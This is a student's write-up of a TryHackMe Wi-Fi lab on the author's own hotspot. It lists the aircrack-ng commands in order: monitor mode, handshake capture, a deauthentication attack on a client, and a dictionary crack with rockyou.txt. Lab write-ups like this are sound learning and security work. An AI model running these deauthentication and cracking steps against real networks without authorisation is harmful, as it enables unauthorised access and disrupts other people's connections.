# Wi-Fi Hacking 101 — Practical Exercise

## Overview
This exercise was completed following the [TryHackMe Wi-Fi Hacking 101 room](https://tryhackme.com/room/wifihacking101).  
It demonstrates the process of capturing WPA handshakes and performing a dictionary attack using Aircrack-ng and related tools in a controlled environment.

> Disclaimer: All activities were conducted on personal networks and are intended solely for ethical, educational use.

---

## Tools Used

- Kali Linux
- Aircrack-ng Suite (airmon-ng, airodump-ng, aireplay-ng, aircrack-ng)
- rockyou.txt wordlist
- Personal mobile hotspot for testing
- Personal iPad for testing

---

## Methodology

### 1. Wordlist Preparation  

Generated random passwords from the rockyou.txt wordlist, filtering for minimum length:

head -n 10000 /usr/share/wordlists/rockyou.txt | awk 'length($0) >= 8' | shuf -n 5

Generated the password 'richard1', which was used as the hotspot password.

### 2. Preparing Wireless Interface

Enabled Monitor Mode:

airmon-ng start wlan0

Checked Wireless Configuration:

iwconfig

### 3. Capturing Network Data

Used airodump-ng to identify the target network and capture handshake data:

airodump-ng wlan0

Filtered by BSSID and channel:

airodump-ng --channel 6 --bssid <MAC_ADDRESS> --write handshake wlan0


### 4. Forcing Handshake Capture

Forced re-authentication using aireplay-ng:

aireplay-ng --deauth 5 -a <BSSID> -c <DEVICE_MAC> wlan0

Successfully captured WPA handshake.

### 5. Cracking the Password

Performed dictionary attack with aircrack-ng:

aircrack-ng handshake-01.cap -w /usr/share/wordlists/rockyou.txt

Key successfully found: richard1

---

## Takeaways

- Understanding WPA Handshake Capture.
- Practical use of Aircrack-ng Suite for Wireless Netowrk Auditing.
- The importance of using strong passwrods to prevent dictionary-based attacks.

## Conclusion

This exercise provided practical experience with Wi-Fi network security assessment techniques and highlighted common vulnerabilities in weak password configurations.

## Future Improvements

- Explore advanced WPA/WPA2 cracking techniques  
- Document attempts with custom wordlists  
- Integrate findings into broader wireless security audit reports

---

## Author
This project was completed as part of ongoing cybersecurity skill development by Monika Swiergon, Bachelor of Information Technology student at RMIT University.

